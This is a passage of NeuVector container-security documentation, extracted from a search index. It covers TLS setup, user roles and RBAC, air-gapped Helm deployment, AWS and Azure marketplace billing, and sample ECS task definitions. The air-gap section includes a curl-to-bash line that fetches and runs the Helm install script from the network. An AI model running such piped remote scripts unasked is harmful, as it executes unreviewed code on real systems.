controller: certificate: secret: https-cert keyFile: tls.key pemFile: tls.pem   Then update with helm upgrade -i neuvector .... For reference here are all the values https://github.com/neuvector/neuvector-helm/tree/master/charts/core.  Support chained certificates​  To support End-to-end TLS, some ingresses/Application Gateways will only support backend servers that can be trusted. NeuVector added support for chained certificates in version 3.2.2. Microsoft's Application Gateway is one example of an Application Gateway requiring a chained certificate when using a not well-known CA.  To add a chained certificate, the example tls.pem file should be a concatenation of the certificates. ","version":"Next 🚧","tagName":"h3"},{"title":"Users and Roles","type":0,"sectionRef":"#","url":"/next/configuration/users","content":"","keywords":"","version":"Next 🚧"},{"title":"Configuring Users and Custom Roles​","type":1,"pageTitle":"Users and Roles","url":"/next/configuration/users#configuring-users-and-custom-roles","content":" The Settings -&gt; Users and Roles menu enables management of users as well as roles. Each user is assigned to a predefined or custom role. Users can be mapped to roles through group integration with LDAP/AD or other SSO system integrations. See the Enterprise Integration section for detailed instructions for each type or directory or SSO integration.  Users​  Users can be configured directly in NeuVector or integrated through directories/SSO. To create a new user in NeuVector go to Settings -&gt; Users &amp; Roles and add the user. Select the role of the user from the predefined roles, or see below to create a custom role.  The default password requirement is minimum 8 characters length, 1 uppercase letter, 1 lowercase letter, 1 numeric character. These and other requirements can be changed by an admin in Settings -&gt; Users under Authentication and Security Policies.  Namespace Restricted Users​  Users can be restricted to certain namespaces. First select the global role (use 'none' if no global role is desired), then click on the Advanced Settings.  Select a role name from the list of roles, then enter the namespace(s) which the user allowed. For example, below is a global reader (view only) role, but for namespace 'demo' the user has admin permissions and for the namespace 'staging' the user has CI/Ops permissions. If a custom role was previously configured that can also be selected.    note If a user has previously logged in through an enterprise integration, their Identify Provider (e.g. OpenID Connect) will be listed. A user can be promoted to a Federated admin if multi-cluster management is in use by selecting the user and editing.  note When a namespace restricted user configures a registry in Assets in NeuVector, only users with access to that namespace can see/scan that registry. Global users will be able to see/manage that registry, but not any users with restricted namespaces / role.  Roles​  Preconfigured roles include Admin, Reader, and CI/Ops. To create a new custom role, select the Roles tab in Settings -&gt; Users &amp; Roles. Name the role and add the appropriate read or write permission to it.    RBAC Permissions​  Admission Control. Manage admission control rules.Audit Events. View Notification -&gt; Risk reports logs.Authentication. Enable directory and SSO (oidc/saml/ldap) configuration.Authorization. Create new users and custom roles.CI Scan. Allows scanning on images through REST API. Useful for configuring a build-phase plug-in scanner user.Compliance. Create custom compliance scripts and review Compliance check results.Event. Access Notifications -&gt; Events logs.Registry Scan. Configure registry scanning and view results.Runtime Policy. Manage Policy menus for Policy Mode (Discover, Monitor, Protect), Network Rules, Process Rules, File Access Rules, DLP, Packet capture, Response Rules.Runtime Scan. Trigger and view run-time vulnerability scanning of containers/nodes/platform.Security Event. Access Notifications -&gt; Security Events logs.System Config. Allow configuration of Settings -&gt; Configuration.  Mapping Groups to Roles and Namespaces​  Groups can be mapped to preset or custom roles in NeuVector. In addition, a role can be restricted to one or more namespaces.  In the LDAP/AD, SAML, or OIDC configuration in Settings, the last section of the configuration screen maps Groups to Roles and Namespaces. First select a default role, if any, for mapping.    To map a group to a role and namespace, click Add to create a new mapping. Select a global role or none. If admin or FedAdmin is selected, this gives write access to all namespaces. If a different role is selected, it can be further restricted by selecting the desired namespace(s).    The following example provides some possible mappings. Demo_admin can read/view all namespaces but has admin rights to the demo and demo2 namespaces. System_admin only has admin rights to the kube-system namespace. And fed_admins has the preset fedAdmin role which gives write access to all resources across multiple clusters.    important If the user is in multiple groups, the role will be 'first matched' in the order listed and group's role assigned. Please adjust the order of configuration for proper behavior by dragging and dropping the mappings to the appropriate order in the list.  Multi-Cluster FedAdmin and Admin Roles for Primary and Remote Management​  When a cluster is promoted to be a Primary cluster, the admin becomes a FedAdmin automatically. The FedAdmin can perform operations on the primary such as generate a federation token for connecting a remote cluster as well as creating federated security rules such as network, process, file, and admission control rules.  Multi-cluster management roles are as follows:  On any cluster, a local admin or a Rancher SSO admin can promote the cluster to become a primary.Ldap/SSO/SAML/OIDC users with admin roles are not able to promote a cluster to primary.Only the FedAdmin can generate the token required to join a remote cluster to the primary.Any admin, including ldap/sso/saml/oidc users can join a remote cluster to the primary if they have the token.Only the FedAdmin can create a new user as a FedAdmin (or FedReader) or assign the FedAdmin (or FedReader) role to an existing user (including ldap/sso/saml/oidc users). ","version":"Next 🚧","tagName":"h3"},{"title":"Deployments of the NeuVector Containers, Services, and Required Configurations","type":0,"sectionRef":"#","url":"/next/deploying","content":"Deployments of the NeuVector Containers, Services, and Required Configurations Topics for planning and deploying for testing and to production on various platforms using Kubernetes, Rancher, OpenShift, &amp; Docker compose.","keywords":"","version":"Next 🚧"},{"title":"Air Gapping NeuVector","type":0,"sectionRef":"#","url":"/next/deploying/airgap","content":"","keywords":"","version":"Next 🚧"},{"title":"Tools Needed​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/next/deploying/airgap#tools-needed","content":" We need to install three tools for downloading all the bits for Neuvector.  Helm - Application Lifecycle ManagerSkopeo - Image/Registry ToolZStandard - Compresstion Algorithm  # install helm curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash # install skopeo - rocky linux based yum install zstd skopeo -y   ","version":"Next 🚧","tagName":"h3"},{"title":"Get Images and Chart​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/next/deploying/airgap#get-images-and-chart","content":" In order to get all the images we are going to use the chart itself. Using Helm let's add the repo and download the chart. We will also use skopeo for downloading and uploading.  # make a directory mkdir -p neuvector/images # add repo helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update local chart helm repo update # pull helm pull neuvector/core -d neuvector   You should now see a file like core-2.4.0.tgz. The version may vary, but this is correct. This is the downloaded chart. Now we need the images. Good thing we can use the chart to figure this out.  # create image list helm template neuvector/core-*.tgz | awk '$1 ~ /image:/ {print $2}' | sed -e 's/\\&quot;//g' &gt; neuvector/images/list.txt # get images for i in $(cat neuvector/images/list.txt); do skopeo copy docker://$i docker-archive:neuvector/images/$(echo $i| awk -F/ '{print $3}'|sed 's/:/_/g').tar:$(echo $i| awk -F/ '{print $3}') done   Fantastic, we should have a directory that looks like:  [root@flux ~]# ls -lR neuvector neuvector: total 16 -rw-r--r--. 1 root root 15892 Jan 8 14:33 core-2.4.0.tgz drwxr-xr-x. 2 root root 153 Jan 8 14:35 images neuvector/images: total 953920 -rw-r--r--. 1 root root 236693504 Jan 8 14:35 controller_5.3.0.tar -rw-r--r--. 1 root root 226704384 Jan 8 14:35 enforcer_5.3.0.tar -rw-r--r--. 1 root root 176 Jan 8 14:34 list.txt -rw-r--r--. 1 root root 331550208 Jan 8 14:35 manager_5.3.0.tar -rw-r--r--. 1 root root 169589760 Jan 8 14:35 scanner_latest.tar -rw-r--r--. 1 root root 12265472 Jan 8 14:35 updater_latest.tar   And we can compress and move everything.  ","version":"Next 🚧","tagName":"h3"},{"title":"Compress and Move​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/next/deploying/airgap#compress-and-move","content":" Compressing is fairly simple. We will use tar with the ZST format for maximum compression.  # compress tar -I zstd -vcf neuvector_airgap.zst neuvector   Now simply move the 400M neuvector_airgap.zst to your network.  ","version":"Next 🚧","tagName":"h3"},{"title":"Uncompress and Load​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/next/deploying/airgap#uncompress-and-load","content":" All we need to do now is uncompress with a similar command. The following will output to director called neuvector.  tar -I zstd -vxf neuvector_airgap.zst   Loading the images into a registry is going to require an understanding of your internal network. For this doc let's use &quot;registry.awesome.sauce&quot; as the DNS name. Loading the images is fairly simple again with skopeo. Please make sure it is installed on the &quot;inside&quot; machine. You will probably need to authenticate with skopeo login for it to work.  # skopeo load export REGISTRY=registry.awesome.sauce for file in $(ls neuvector/images | grep -v txt ); do skopeo copy docker-archive:neuvector/images/$file docker://$(echo $file | sed 's/.tar//g' | awk -F_ '{print &quot;'$REGISTRY'/neuvector/&quot;$1&quot;:&quot;$2}') done   With all the images loaded in a registry we can install with Helm.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy with Helm​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/next/deploying/airgap#deploy-with-helm","content":" Deploying with Helm is fairly straight forward. There are a few values that are needed to insure the images are pulling from the local registry. Here is a good example. You may need to tweak a few settings. Please follow the Helm best practices for values.yaml. Note the imagePullSecrets field. This is the secret for your cluster to authenticate to the registry.  # helm install example # variables export REGISTRY=registry.awesome.sauce # registry URL export NEU_URL=neuvector.awesome.sauce # neuvector URL # helm all the things -- read all the options being set helm upgrade -i neuvector --namespace neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set controller.pvc.enabled=true --set controller.pvc.capacity=10Gi --set manager.svc.type=ClusterIP --set registry=$REGISTRY --set tag=5.3.0 --set controller.image.repository=neuvector/controller --set enforcer.image.repository=neuvector/enforcer --set manager.image.repository=neuvector/manager --set cve.updater.image.repository=neuvector/updater --set manager.ingress.host=$NEU_URL  ","version":"Next 🚧","tagName":"h3"},{"title":"AWS Marketplace Billing","type":0,"sectionRef":"#","url":"/next/deploying/awsmarketplace","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy NeuVector from AWS Marketplace Pay-As-You-Go Listing​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/next/deploying/awsmarketplace#deploy-neuvector-from-aws-marketplace-pay-as-you-go-listing","content":" NeuVector Prime supports monthly billing through your AWS account in a Pay-As-You-Go (PAYG) billing subscription for SUSE support of NeuVector.  Usage is billed monthly based on the average number of nodes protected by NeuVector during the month. Please see the NeuVector marketplace listing for your region for specific pricing tiers and other information.  NeuVector Prime with 24x7 Support (non-EU and non-UK only)NeuVector Prime with 24x7 Support (EU and UK only)  note AWS Private Offers are available for NeuVector for special pricing situations in lieu of standard PAYG pricing.  ","version":"Next 🚧","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/next/deploying/awsmarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only EKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.0 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your AWS account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the AWS Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the AWS marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.0 or later before the backup and removal. For Helm based deployments, this is a sample Helm upgrade command (replacing account ID, IAM role name, previous helm version values file etc):  helm upgrade -n neuvector neuvector oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.4.30002023052201 --create-namespace \\ --set awsbilling.accountNumber=$AWS_ACCT_ID,awsbilling.roleName=$IAM_ROLE_NAME \\ --set awsbilling.enabled=true,containerd.enabled=true -f values-x.y.z.yaml   Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of AWS platforms (only EKS at initial July release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the AWS marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploying NeuVector Prime through the AWS Marketplace​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/next/deploying/awsmarketplace#deploying-neuvector-prime-through-the-aws-marketplace","content":" A special billing interface is required to enable PAYG to your AWS account. This must be deployed, together with NeuVector from the AWS Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions for your region in the marketplace listing above.  The helm install command uses defaults in the values.yaml file. Important defaults to check are the manager service type (LoadBalancer) and container run-time (containerd - which is the typical default for EKS clusters). The default admin username is disabled, and users are required to set a username and password through a secret prior to deployment.  Setting the Admin Username and Password​  It is required to set the admin username and password as a Kubernetes secret prior to deployment.  kubectl create secret generic neuvector-init --from-file=userinitcfg.yaml -n neuvector   note The above step is mandatory, otherwise an admin user will not be created upon NeuVector deployment, making the NeuVector deployment unmanageable.  Sample userinitcfg.yaml content:  users: - Fullname: admin Password: (ValidPassword) Role: admin # 8 character(s) minimum,1 uppercase character(s),1 lowercase character(s), 1 number(s).   Sample helm install command:  helm install -n neuvector neuvector --create-namespace \\ oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.6.1 \\ --set awsbilling.accountNumber=$AWS_ACCOUNT_ID \\ --set awsbilling.roleName=$ROLE_NAME \\ --set manager.svc.type=LoadBalancer   See the Usage instructions on the AWS marketplace listing for detailed NeuVector instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].hostname}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://a2647ecdxx33498948a70eea84c5-18386345695.us-west-2.elb.amazonaws.com:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  note The NeuVector scanner image is updated daily with a new CVE database on the NeuVector docker hub registry. It is recommended that the image path be changed to allow for automated daily updates by modifying the scanner and updater image paths AFTER successful initial deployment. For example: kubectl set image deploy/neuvector-scanner-pod neuvector-scanner-pod=docker.io/neuvector/scanner:latest kubectl set image cronjob/neuvector-updater-pod neuvector-updater-pod=docker.io/neuvector/updater:latest   ","version":"Next 🚧","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/next/deploying/awsmarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service. This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question. For multi-cluster configurations, only the Primary cluster's support config is required, even if the support inquiry is for a downstream remote cluster. If you do not have access to the Primary cluster, the remote cluster's support config is acceptable.  ","version":"Next 🚧","tagName":"h3"},{"title":"Upgrading a NeuVector PAYG Cluster​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/next/deploying/awsmarketplace#upgrading-a-neuvector-payg-cluster","content":" The AWS marketplace PAYG listing helm chart is tied to a specific billing adapter AND NeuVector version. These are updated periodically as new versions of the billing adapter or NeuVector are released. To update the NeuVector version to the latest version supported by the marketplace listing, use the Helm update command as normal. To update the NeuVector version to a more recent version than is specified in the marketplace listing, manually change the helm values for the images (registry, paths, version tags) to point to the desired version (e.g. docker.io, neuvector/controller:5.2.5). ","version":"Next 🚧","tagName":"h3"},{"title":"Azure Marketplace Billing","type":0,"sectionRef":"#","url":"/next/deploying/azuremarketplace","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy NeuVector from Azure Marketplace Pay-As-You-Go Listing​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/next/deploying/azuremarketplace#deploy-neuvector-from-azure-marketplace-pay-as-you-go-listing","content":" NeuVector Prime supports monthly billing through your Azure account in a Pay-As-You-Go (PAYG) billing subscription for SUSE support of NeuVector.  Usage is billed monthly based on the average number of nodes protected by NeuVector during the month. Please see the Azure Marketplace listing for your appropriate region for specific pricing tiers and other information.  NeuVector Prime with 24x7 Support (non-EU and non-UK only)NeuVector Prime with 24x7 Support (EU and UK only)  Additional Usage Instructions can be found here.  note Azure Private Offers are available for NeuVector for special pricing situations in lieu of standard PAYG pricing.  ","version":"Next 🚧","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/next/deploying/azuremarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only AKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.2 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your Azure account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the Azure Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the Azure marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.2 or later before the backup and removal. Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of Azure platforms (only AKS at initial November 2023 release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the Azure marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploying NeuVector Prime through the Azure Marketplace​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/next/deploying/azuremarketplace#deploying-neuvector-prime-through-the-azure-marketplace","content":" A special billing interface is required to enable PAYG to your Azure account. This must be deployed, together with NeuVector from the Azure Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions.  Setting the Admin Password​  It is required to set the admin password in the Azure create offer, &quot;NeuVector Configuration&quot; section. See the Usage instructions on the Azure marketplace listing for NeuVector for instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].ip}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://&lt;$SERVICE_IP&gt;:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  ","version":"Next 🚧","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/next/deploying/azuremarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service. This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question. For multi-cluster configurations, only the Primary cluster's support config is required, even if the support inquiry is for a downstream remote cluster. If you do not have access to the Primary cluster, the remote cluster's support config is acceptable.  ","version":"Next 🚧","tagName":"h3"},{"title":"Upgrading a NeuVector PAYG Cluster​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/next/deploying/azuremarketplace#upgrading-a-neuvector-payg-cluster","content":" The Azure NeuVector Prime offer consists of several different containers. As newer versions of these containers are released, updated application bundles will be published to the Azure Marketplace. To upgrade to the most recent version that is specified in the marketplace listing, see the Usage instructions. ","version":"Next 🚧","tagName":"h3"},{"title":"Amazon ECS","type":0,"sectionRef":"#","url":"/next/deploying/ecs","content":"","keywords":"","version":"Next 🚧"},{"title":"Important: Deployment on Amazon ECS is No Longer Supported​","type":1,"pageTitle":"Amazon ECS","url":"/next/deploying/ecs#important-deployment-on-amazon-ecs-is-no-longer-supported","content":" The reference section below is not being maintained. However, it may provide some assistance in understanding how to deploy the Allinone on ECS.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy on AWS Using ECS​","type":1,"pageTitle":"Amazon ECS","url":"/next/deploying/ecs#deploy-on-aws-using-ecs","content":" This is an example of how to deploy NeuVector using ECS.  note Please see the Kubernetes examples for EKS.  Prepare several Amazon ECS instances which have the Docker engine and ECS agent containers built-in. Pick one node for the management console. Then define Security Group rules that allow inbound TCP port 8443 (NeuVector’s default management console port) for access by your client browser. Define a Security Group that allows TCP and UDP ports on 18300, 18301, 18400, 18401 . This is used by NeuVector enforcers to talk to the Controllers/Allinone. Apply this Security Group to all the ECS instances that will be deploying the NeuVector enforcers and controllers/allinone. Set an attribute on the nodes that you want to deploy NeuVector allinone or controller container. For example, if you want to run NeuVector in a controller HA mode, the recommendation is to pick at least 3 nodes then add the attribute to all of the 3 nodes.  This is how to add attributes to your ECS instances:  Select the instance, then pick “View/Edit Attributes” from the Actions drop down menu.    Then add a new attribute. For example “allinone-node” with value “true”.    Create the Allinone Task Definition. Create a new Task Definition for the Allinone container. You can use the ECS interface to manually create it or paste in the sample JSON file (see below for samples). Refer to section “1. Deploying NeuVector” of these docs for how to configure the Allinone.  Enter the placement constraint. For example, if you used the attribute labeling above, then enter this in the constraint.  attribute:allinone-node=~true     note If you examine the updated JSON file now you’ll see the placement constraint added to it.  Create a new service for the Allinone task. Set the “Placement Templates” to “One Task Per Host” so that only one Allinone/Controller can run on any host. You will also see the constraint will be used “memberOf(attribute:allinone-node=~true) which requires the node to have that attribute.    Now you can deploy the Allinone service. Set the “Number of tasks” to the desired Allinone/Controller number. Now the NeuVector Allinone or Controller containers will start running on the nodes selected. After the Allinone starts running you should be able to connect to the NeuVector console through HTTPS on port 8443. Create the Enforcer Task Definition. This is similar to the Allinone task. Configure manually through the ECS console or use the JSON sample below.  For the Enforcer placement constraint you will require that the Enforcer must NOT be on the same node as the allinone.  attribute:allinone-node!~true     Create a new service for the Enforcer task. Again, set the Task Placement to “One Task Per Host” so only one Enforcer is deployed on each host. Also note the additional constraint should show that it prevents deployment on an allinone node.    Deploy this service with desired number of enforcer nodes in “Number of tasks”. Very shortly all the enforcers will be up and running. From the NeuVector console you will be able to see all nodes being detected with enforcers.  ","version":"Next 🚧","tagName":"h3"},{"title":"Sample ECS JSON Task Definitions​","type":1,"pageTitle":"Amazon ECS","url":"/next/deploying/ecs#sample-ecs-json-task-definitions","content":" You can use the following samples as starting points for configuring the task definitions for the NeuVector containers.  Create a new task definition, then click Configure Via JSON at bottom. Before pasting in the json below, replace the IP address and image path (find REPLACE in samples). Typically, the IP address would be the Private IP address of the AWS Instance where the allinone will run. You can also specific a different family name than my-allinone/my-enforcer (at the bottom of json).  Sample Allinone json file:  { &quot;networkMode&quot;: &quot;bridge&quot;, &quot;taskRoleArn&quot;: null, &quot;pidMode&quot;: &quot;host&quot;, &quot;containerDefinitions&quot;: [ { &quot;volumesFrom&quot;: [], &quot;memory&quot;: null, &quot;extraHosts&quot;: null, &quot;dnsServers&quot;: null, &quot;disableNetworking&quot;: null, &quot;dnsSearchDomains&quot;: null, &quot;portMappings&quot;: [ { &quot;hostPort&quot;: 18300, &quot;containerPort&quot;: 18300, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18400, &quot;containerPort&quot;: 18400, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18401, &quot;containerPort&quot;: 18401, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;udp&quot; }, { &quot;hostPort&quot;: 8443, &quot;containerPort&quot;: 8443, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 1443, &quot;containerPort&quot;: 10443, &quot;protocol&quot;: &quot;tcp&quot; } ], &quot;hostname&quot;: null, &quot;essential&quot;: true, &quot;entryPoint&quot;: null, &quot;mountPoints&quot;: [ { &quot;containerPath&quot;: &quot;/lib/modules&quot;, &quot;sourceVolume&quot;: &quot;modules&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/var/run/docker.sock&quot;, &quot;sourceVolume&quot;: &quot;dockersock&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/host/proc&quot;, &quot;sourceVolume&quot;: &quot;proc&quot;, &quot;readOnly&quot;: true }, { &quot;containerPath&quot;: &quot;/host/cgroup&quot;, &quot;sourceVolume&quot;: &quot;cgroup&quot;, &quot;readOnly&quot;: true } ], &quot;name&quot;: &quot;allinone&quot;, &quot;ulimits&quot;: null, &quot;dockerSecurityOptions&quot;: null, &quot;environment&quot;: [ { &quot;name&quot;: &quot;CLUSTER_JOIN_ADDR&quot;, &quot;value&quot;: &quot;REPLACE: Private IP&quot; } ], &quot;links&quot;: null, &quot;workingDirectory&quot;: null, &quot;readonlyRootFilesystem&quot;: false, &quot;image&quot;: &quot;REPLACE: Image Path/Name&quot;, &quot;command&quot;: null, &quot;user&quot;: null, &quot;dockerLabels&quot;: { &quot;com.myself.name&quot;: &quot;neuvector&quot; }, &quot;logConfiguration&quot;: null, &quot;cpu&quot;: 0, &quot;privileged&quot;: true, &quot;memoryReservation&quot;: 768 } ], &quot;volumes&quot;: [ { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/lib/modules&quot; }, &quot;name&quot;: &quot;modules&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/var/run/docker.sock&quot; }, &quot;name&quot;: &quot;dockersock&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/proc&quot; }, &quot;name&quot;: &quot;proc&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/sys/fs/cgroup&quot; }, &quot;name&quot;: &quot;cgroup&quot; } ], &quot;family&quot;: &quot;my-allinone&quot;, &quot;placementConstraints&quot;: [] }   Sample Enforcer json file:  { &quot;networkMode&quot;: &quot;bridge&quot;, &quot;taskRoleArn&quot;: null, &quot;pidMode&quot;: &quot;host&quot;, &quot;containerDefinitions&quot;: [ { &quot;volumesFrom&quot;: [], &quot;memory&quot;: null, &quot;extraHosts&quot;: null, &quot;dnsServers&quot;: null, &quot;disableNetworking&quot;: null, &quot;dnsSearchDomains&quot;: null, &quot;portMappings&quot;: [ { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18401, &quot;containerPort&quot;: 18401, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;udp&quot; } ], &quot;hostname&quot;: null, &quot;essential&quot;: true, &quot;entryPoint&quot;: null, &quot;mountPoints&quot;: [ { &quot;containerPath&quot;: &quot;/lib/modules&quot;, &quot;sourceVolume&quot;: &quot;modules&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/var/run/docker.sock&quot;, &quot;sourceVolume&quot;: &quot;dockersock&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/host/proc&quot;, &quot;sourceVolume&quot;: &quot;proc&quot;, &quot;readOnly&quot;: true }, { &quot;containerPath&quot;: &quot;/host/cgroup&quot;, &quot;sourceVolume&quot;: &quot;cgroup&quot;, &quot;readOnly&quot;: true } ], &quot;name&quot;: &quot;enforcer&quot;, 